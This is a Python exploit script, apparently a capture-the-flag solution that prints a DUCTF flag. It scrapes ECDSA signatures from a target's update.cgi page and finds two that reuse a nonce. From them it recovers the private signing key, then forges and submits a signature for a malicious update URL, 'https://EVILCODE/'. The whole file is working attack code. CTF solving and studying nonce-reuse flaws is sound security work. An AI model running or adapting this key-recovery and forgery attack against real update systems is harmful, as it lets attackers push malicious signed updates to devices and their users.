import sys
import requests
import re
from bs4 import BeautifulSoup
import base64
from Crypto.Hash import SHA3_512
from Crypto.Util import asn1
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from base64 import b64encode

soup = BeautifulSoup(
    requests.get(f"http://{sys.argv[1]}/update.cgi").text, "lxml"
)

signatures = []
for row in soup.select("tr"):
    cells = row.select("td")
    if cells:
        signatures.append(
            (
                cells[0].text.strip(),
                list(
                    asn1.DerSequence().decode(base64.b64decode(cells[1].text.strip()))
                ),
            )
        )

duplicates = []
seen = {}
for i, signature in enumerate(signatures):
    url = signature[0]
    r, s = signature[1]
    if r in seen:
        duplicates = [(url, s), seen[r]]
        break

    seen[r] = (url, s)


print(duplicates)

zs = [
    int.from_bytes(SHA3_512.new(d[0].encode()).digest(), "big") >> 256
    for d in duplicates
]
ss = [d[1] for d in duplicates]
n = 115792089210356248762697446949407573529996955224135760342422259061068512044369
k = ((zs[0] - zs[1]) * pow(ss[0] - ss[1], -1, n)) % n
da = (((ss[0] * k) - zs[0]) * pow(int(r), -1, n)) % n
k = ECC.construct(curve="secp256r1", d=da)

forged_signature = DSS.new(k, "fips-186-3", "der").sign(
    SHA3_512.new(b"https://EVILCODE/")
)

print(b64encode(forged_signature).decode())

result = requests.post(
    f"https://{sys.argv[1]}/update.cgi",
    data={
        "url": "https://EVILCODE/",
        "signature": b64encode(forged_signature).decode(),
    },
).text

print(re.search(r"DUCTF\{.*\}", result)[0])
